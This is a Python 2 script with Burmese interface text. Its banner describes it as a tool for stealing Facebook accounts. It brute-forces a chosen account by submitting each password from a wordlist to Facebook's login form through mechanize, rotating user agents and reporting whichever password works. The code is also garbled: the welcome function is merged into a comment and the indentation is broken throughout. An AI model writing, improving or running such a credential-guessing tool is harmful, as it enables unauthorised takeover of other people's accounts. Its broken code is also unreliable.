#!/usr/bin/env python# -*- coding: UTF-8 -*- 
import sys
import mechanize
import cookielib
import random


email = str(raw_input("user nameထည့္ (or) Emailထည့္(or) Phone နံပါတ္ထည့္: "))

passwordlist = str(raw_input("password file : ")) 

login = 'https://www.facebook.com/login.php?login_attempt=1'

useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]


def main():	
 global br	
 br = mechanize.Browser()	
 cj = cookielib.LWPCookieJar()
 br.set_handle_robots(False)
 br.set_handle_redirect(True)
 br.set_cookiejar(cj)	
 br.set_handle_equiv(True)
 br.set_handle_referer(True)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)	
 welcome()	
 search()
print("Password မေတြ႕ပါခင္ဗ်ာ") 	
 
def brute(password):
  sys.stdout.write("\r[*] ႀကိဳးစားေနသည္ ..... {}\n".format(password))
  sys.stdout.flush()
  br.addheaders = [('User-agent', random.choice(useragents))]	
  site = br.open(login)
  br.select_form(nr = 0)	
  br.form['email'] = email
  br.form['pass'] = password	
  sub = br.submit()	
  log = sub.geturl()	
  if log != login and (not 'login_attempt' in log):			
   print("\n\n[+] Password Find = {}".format(password))			
   raw_input("ထြက္ရန္နွိပ္ပါတစ္ခုခုနွိပ္ပါ...")			
   sys.exit(1) 			
   
def search():	
    global password	
    passwords = open(passwordlist,"r")	
    for password in passwords:	
     password = password.replace("\n","")	
     brute(password)
     #welcome def welcome():	
     wel = """
     +=====================================+
     |......... Facebook ခိုးရန္အတြက္ .........|
     +-------------------------------------+ 
     | #Author: Any myanmar |	 Version 1.0 |
     | Eric is develop this code in home   |
     +=====================================+
     |.......... Facebook Eric .....-......|
     +-------------------------------------+\n\n"""
     
     

	total = open(passwordlist,"r")
	total = total.readlines()
	print wel 
	print " [*] ဖြင့္မည့္အေကာင့္: {}".format(email)
	print " [*] ဖတ္ေနဆဲ:" , len(total), "passwords"
	print " [*] ဖြင့္ေနသည္, ခဏေစာင့္ပါ ...\n\n"

	if __name__ == '__main__':	
  main()

     
